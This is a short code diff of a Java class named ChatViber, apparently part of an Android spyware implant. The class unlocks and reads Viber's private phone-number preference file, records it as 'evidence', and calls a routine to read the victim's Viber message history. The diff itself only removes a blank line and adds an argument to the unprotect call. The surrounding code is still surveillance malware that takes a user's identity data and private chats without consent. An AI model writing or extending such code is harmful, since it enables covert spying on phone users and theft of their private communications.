@@ -67,7 +67,6 @@ public class ChatViber extends SubModuleChat {
 		if (account != null) {
 
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.VIBER, account);
-
 			readViberMessageHistory();
 		}
 
@@ -80,7 +79,7 @@ public class ChatViber extends SubModuleChat {
 		String number = null;
 		String file = "/data/data/com.viber.voip/files/preferences/reg_viber_phone_num";
 
-		if (Path.unprotect(file, 4)) {
+		if (Path.unprotect(file, 4, false)) {
 			FileInputStream fileInputStream;
 			try {
 				fileInputStream = new FileInputStream(file);
